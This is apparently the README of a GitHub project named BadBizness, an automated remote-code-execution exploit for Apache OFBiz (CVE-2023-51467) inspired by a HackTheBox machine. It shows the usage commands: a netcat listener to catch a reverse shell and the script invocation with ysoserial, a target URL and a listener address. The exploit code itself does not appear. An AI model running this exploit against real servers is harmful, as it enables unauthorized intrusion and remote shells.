# BadBizness
Automatic exploitation script for the Java web framework [OF Biz](https://ofbiz.apache.org/) under CVE-2023-51467. Inspired by the HackTheBox machine [Bizness](https://app.hackthebox.com/machines/582).

## Usage and Example
This script requires the tool [ysoserial](https://github.com/frohoff/ysoserial/releases) and OpenJDK version 11. See usage menu for installation.

Setup a listener to catch the shell with your preferred method. Here is a netcat example:
```
nc -nlvp 1337
```
Execute the script:
```
python3 badbizness.py [path to ysoserial-all.jar] [TARGET BASE URL] [LISTENER IP] [LISTENER PORT]

python3 badbizness.py /home/twopoint/ysoserial-all.jar http://example.com:1337 10.10.10.10. 1337
```
## Disclaimer and Credit
This tool was meant as a way to learn more about Python. I credit [this](https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC) script for helping me thoroughly.
